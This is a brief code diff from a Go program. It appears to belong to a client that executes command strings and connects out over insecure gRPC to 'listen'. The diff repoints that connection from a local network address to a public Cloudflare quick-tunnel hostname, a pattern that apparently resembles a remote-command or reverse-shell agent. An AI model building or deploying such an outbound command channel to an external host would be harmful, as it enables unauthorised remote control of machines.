@@ -66,7 +66,7 @@ func Execute(cmd string) (string, error) {
 }
 
 func connectAndListen() error {
-	conn, err := grpc.NewClient("192.168.0.161:8080", grpc.WithTransportCredentials(insecure.NewCredentials()))
+	conn, err := grpc.NewClient("https://past-toe-garcia-mixture.trycloudflare.com", grpc.WithTransportCredentials(insecure.NewCredentials()))
 	if err != nil {
 		return err
 	}
